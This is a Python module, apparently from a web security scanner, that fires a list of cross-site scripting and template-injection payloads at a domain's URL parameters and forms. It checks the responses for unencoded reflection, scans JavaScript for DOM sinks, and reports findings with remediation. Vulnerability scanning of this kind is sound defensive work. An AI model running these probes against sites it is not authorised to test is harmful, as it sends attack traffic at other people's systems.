"""
XSS Hunter — tests all input vectors for Cross-Site Scripting vulnerabilities.
"""

import asyncio
import logging
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)
TIMEOUT = httpx.Timeout(10.0)
RATE_LIMIT_DELAY = 0.5

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<video><source onerror=\"alert('XSS')\">",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
]

# Strings that indicate template injection success
TEMPLATE_INJECTION_RESULT = "49"

# DOM XSS sinks
DOM_SINKS = [
    r"innerHTML\s*=",
    r"document\.write\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"document\.location\s*=",
    r"window\.location\s*=",
    r"\.src\s*=",
    r"outerHTML\s*=",
]


async def run_xss(domain: str, endpoints: list[str], emit) -> list[dict]:
    findings = []

    await emit("progress", {"module": "xss", "step": "collect_inputs", "message": "Collecting input vectors..."})

    # Build test targets from endpoints with query params
    targets_with_params = []
    for url in endpoints:
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            if params:
                targets_with_params.append((url, params))

    # Also check common param names on the base domain
    common_params = ["q", "search", "name", "id", "page", "query", "input", "text", "url", "s"]
    base_url = f"https://{domain}/"
    base_params = {p: ["test"] for p in common_params}
    targets_with_params.append((base_url, base_params))

    await emit("progress", {"module": "xss", "step": "test_reflected", "message": f"Testing {len(targets_with_params)} URLs for reflected XSS..."})

    tasks = [_test_reflected_xss(url, params, emit) for url, params in targets_with_params[:20]]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            findings.extend(r)

    await emit("progress", {"module": "xss", "step": "test_forms", "message": "Testing HTML forms for XSS..."})

    form_findings = await _test_forms_xss(f"https://{domain}", emit)
    findings.extend(form_findings)

    await emit("progress", {"module": "xss", "step": "dom_xss", "message": "Scanning JavaScript for DOM XSS sinks..."})

    js_files = [u for u in endpoints if u.endswith(".js")][:20]
    dom_findings = await _detect_dom_xss(js_files, emit)
    findings.extend(dom_findings)

    await emit("module_complete", {"module": "xss", "results": findings})
    return findings


async def _test_reflected_xss(url: str, params: dict, emit) -> list[dict]:
    findings = []

    for param_name in list(params.keys())[:5]:
        for payload in XSS_PAYLOADS[:6]:  # test a subset per param
            test_params = dict(params)
            test_params[param_name] = [payload]

            parsed = urlparse(url)
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))

            try:
                async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=True, verify=False) as client:
                    resp = await client.get(test_url)
                    response_text = resp.text

                    # Check for unencoded payload reflection
                    if payload in response_text and not _is_encoded(payload, response_text):
                        finding = {
                            "type": "xss",
                            "subtype": "reflected",
                            "severity": "high",
                            "title": f"Reflected XSS in parameter '{param_name}'",
                            "description": (
                                f"The parameter '{param_name}' at {url} reflects user input "
                                "without encoding. An attacker can inject JavaScript that runs in victims' browsers."
                            ),
                            "remediation": "HTML-encode all user input before reflecting it in responses. Use a Content-Security-Policy.",
                            "evidence": {
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "reflected": True,
                            },
                        }
                        findings.append(finding)
                        await emit("finding", finding)
                        break  # one finding per param is enough

                    # Check for template injection ({{7*7}} → 49)
                    if "{{7*7}}" in payload and TEMPLATE_INJECTION_RESULT in response_text:
                        finding = {
                            "type": "xss",
                            "subtype": "template_injection",
                            "severity": "critical",
                            "title": f"Server-Side Template Injection in parameter '{param_name}'",
                            "description": (
                                f"The parameter '{param_name}' at {url} evaluates template expressions. "
                                "{{7*7}} produced '49' in the response, indicating SSTI."
                            ),
                            "remediation": "Never pass user input directly to template engines. Sanitize and validate all inputs.",
                            "evidence": {
                                "url": test_url,
                                "parameter": param_name,
                                "payload": "{{7*7}}",
                                "result": TEMPLATE_INJECTION_RESULT,
                            },
                        }
                        findings.append(finding)
                        await emit("finding", finding)

                await asyncio.sleep(RATE_LIMIT_DELAY)
            except Exception as e:
                logger.debug("XSS test failed %s: %s", test_url, e)

    return findings


async def _test_forms_xss(base_url: str, emit) -> list[dict]:
    findings = []
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(base_url)
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form")[:5]:
                action = form.get("action", "/")
                method = form.get("method", "get").lower()
                form_url = action if action.startswith("http") else f"{base_url.rstrip('/')}/{action.lstrip('/')}"

                inputs = form.find_all("input")
                if not inputs:
                    continue

                for payload in XSS_PAYLOADS[:4]:
                    form_data = {}
                    for inp in inputs:
                        inp_name = inp.get("name", "")
                        inp_type = inp.get("type", "text")
                        if inp_name and inp_type not in ["submit", "button", "image", "file", "checkbox", "radio"]:
                            form_data[inp_name] = payload
                        elif inp_name:
                            form_data[inp_name] = inp.get("value", "")

                    try:
                        if method == "post":
                            r = await client.post(form_url, data=form_data)
                        else:
                            r = await client.get(form_url, params=form_data)

                        if payload in r.text and not _is_encoded(payload, r.text):
                            finding = {
                                "type": "xss",
                                "subtype": "reflected_form",
                                "severity": "high",
                                "title": f"Reflected XSS via Form at {form_url}",
                                "description": (
                                    f"A form at {form_url} ({method.upper()}) reflects input without encoding. "
                                    "Attacker can craft a malicious link submitting the form with XSS payload."
                                ),
                                "remediation": "HTML-encode form values before reflecting. Validate and sanitize all inputs server-side.",
                                "evidence": {
                                    "form_url": form_url,
                                    "method": method,
                                    "payload": payload,
                                    "data": str(form_data)[:300],
                                },
                            }
                            findings.append(finding)
                            await emit("finding", finding)
                            break

                        await asyncio.sleep(RATE_LIMIT_DELAY)
                    except Exception:
                        pass
    except Exception as e:
        logger.debug("Form XSS test failed: %s", e)

    return findings


async def _detect_dom_xss(js_files: list[str], emit) -> list[dict]:
    findings = []
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
            for js_url in js_files:
                try:
                    resp = await client.get(js_url)
                    if resp.status_code != 200:
                        continue
                    content = resp.text[:100_000]
                    sinks_found = []

                    for sink_pattern in DOM_SINKS:
                        if re.search(sink_pattern, content):
                            # Check if location/URLSearchParams/hash is used nearby
                            if re.search(r"(location\.|URLSearchParams|window\.location|document\.URL|document\.referrer)", content):
                                sinks_found.append(sink_pattern.replace(r"\s*", " ").replace(r"\(", "("))

                    if sinks_found:
                        finding = {
                            "type": "xss",
                            "subtype": "dom",
                            "severity": "high",
                            "title": f"Potential DOM XSS in {js_url.split('/')[-1]}",
                            "description": (
                                f"JavaScript file {js_url} uses dangerous DOM sinks "
                                f"({', '.join(sinks_found[:3])}) with values that appear to originate from URL/user input."
                            ),
                            "remediation": "Use textContent instead of innerHTML. Sanitize values from location/URL before inserting into DOM.",
                            "evidence": {
                                "file": js_url,
                                "sinks": sinks_found[:5],
                            },
                        }
                        findings.append(finding)
                        await emit("finding", finding)

                    await asyncio.sleep(RATE_LIMIT_DELAY)
                except Exception:
                    pass
    except Exception as e:
        logger.debug("DOM XSS scan failed: %s", e)

    return findings


def _is_encoded(payload: str, response: str) -> bool:
    """Check if the payload is HTML-encoded in the response."""
    encoded = (
        payload
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )
    return encoded in response and payload not in response
